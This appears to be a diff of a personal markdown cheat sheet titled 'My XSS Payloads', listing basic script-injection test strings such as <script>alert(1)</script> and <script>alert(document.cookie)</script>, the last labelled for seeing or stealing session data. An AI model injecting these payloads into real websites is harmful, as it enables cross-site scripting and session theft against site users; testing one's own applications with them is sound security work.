@@ -1,6 +1,9 @@
 # My XSS Payloads
+-------------------------------------------------------------------------------------
 
-## Test if Payload is working
+[+] Test if Payload is working
+
++ First step to check fir XSS
 1. <script>alert('SudoHopeX')</script>
 2. <script>alert(1)</script>
 
@@ -12,3 +15,6 @@
 
 + See (steal) session data.
 <script>alert(document.cookie)</script>
+
+
+-------------------------------------------------------------------------------------
